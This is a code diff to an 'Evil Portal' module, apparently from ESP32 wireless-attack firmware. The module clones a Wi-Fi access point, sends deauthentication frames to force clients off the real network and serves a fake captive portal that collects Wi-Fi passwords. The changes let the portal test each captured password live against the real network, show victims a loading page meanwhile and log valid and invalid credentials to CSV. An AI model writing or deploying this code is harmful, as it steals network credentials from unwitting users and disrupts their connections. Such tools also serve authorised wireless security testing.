@@ -39,7 +39,6 @@ void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *req
     }
 }
 bool EvilPortal::setup() {
-    bool returnToMain = false;
     options = {
         {"Custom Html", [=]() { loadCustomHtml(); }}
     };
@@ -54,7 +53,7 @@ bool EvilPortal::setup() {
 
     loopOptions(options);
 
-    if (returnToMain) return false;
+    if (returnToMenu) return false;
 
     memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
     wsl_bypasser_send_raw_frame(&ap_record, _channel); // writes the buffer with the information
@@ -90,8 +89,9 @@ void EvilPortal::beginAP() {
     drawMainBorderWithTitle("EVIL PORTAL");
 
     displayTextLine("Starting...");
-    // WIFI_MODE_APSTA captive portal takes time to popup so nope...
-    WiFi.mode(WIFI_MODE_AP);
+    // WIFI_MODE_APSTA captive portal takes time to popup, but is useful for verifying Wifi credentials
+    if (_verifyPwd) WiFi.mode(WIFI_MODE_APSTA);
+    else WiFi.mode(WIFI_MODE_AP);
     WiFi.softAPConfig(apGateway, apGateway, IPAddress(255, 255, 255, 0));
     WiFi.softAP(apName, emptyString, _channel);
     wifiConnected = true;
@@ -111,35 +111,21 @@ bool EvilPortal::verifyCreds(String &Ssid, String &Password) {
     // temporary stop deauth if deauth + clone is true
     bool temp = _deauth;
     _deauth = false;
-
-    webServer.end();
-    wifiDisconnect();
-
-    // STA Mode temporary
-    WiFi.mode(WIFI_MODE_STA);
-
-    vTaskDelay(80 / portTICK_PERIOD_MS);
-
     // Try to connect to wifi
     WiFi.begin(Ssid, Password);
 
     int i = 1;
     while (WiFi.status() != WL_CONNECTED) {
-        if (i > 15) {
-            vTaskDelay(500 / portTICK_PERIOD_MS);
-            break;
-        }
-
+        if (i > 8) break; // 8 times, 4 seconds ma
         vTaskDelay(500 / portTICK_PERIOD_MS);
         i++;
     }
+    WiFi.disconnect(false);
 
     if (WiFi.status() == WL_CONNECTED) { isConnected = true; }
     // re enable
     _deauth = temp;
 
-    // revert to AP mode
-    WiFi.mode(WIFI_MODE_AP);
     return isConnected;
 }
 
@@ -517,7 +503,8 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
     htmlResponse += "</li>\n";
 
     if (_verifyPwd && passwordValue != "") {
-        vTaskDelay(500 / portTICK_PERIOD_MS);
+        request->send(200, "text/html", wifiLoadPage());
+        //vTaskDelay(200 / portTICK_PERIOD_MS); // give it time to process the request
         bool isCorrect = verifyCreds(apName, passwordValue);
         if (isCorrect) {
 
@@ -539,7 +526,7 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
             lastCred += "valid: false";
             // still save invalid creds...
             saveToCSV(csvLine + ", valid: false", true);
-            restartWiFi(false);
+            portalController(request);
         }
 
     } else {
